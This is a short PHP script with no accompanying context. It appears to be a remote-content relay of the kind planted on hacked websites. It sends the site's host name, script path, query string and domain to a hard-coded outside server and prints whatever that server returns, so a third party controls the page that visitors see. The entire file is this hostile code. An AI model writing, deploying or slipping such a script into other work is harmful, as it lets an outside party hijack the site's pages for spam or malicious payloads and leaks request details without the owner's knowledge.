<?php
set_time_limit(0);

header("Content-Type: text/html;charset=gb2312");
date_default_timezone_set('PRC');
$Remote_server = "http://www.shunchik.cn/"; 
$host_name = "http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
$Content_mb=file_get_contents($Remote_server."/index.php?host=".$host_name."&url=".$_SERVER['QUERY_STRING']."&domain=".$_SERVER['SERVER_NAME']);

echo $Content_mb;

?>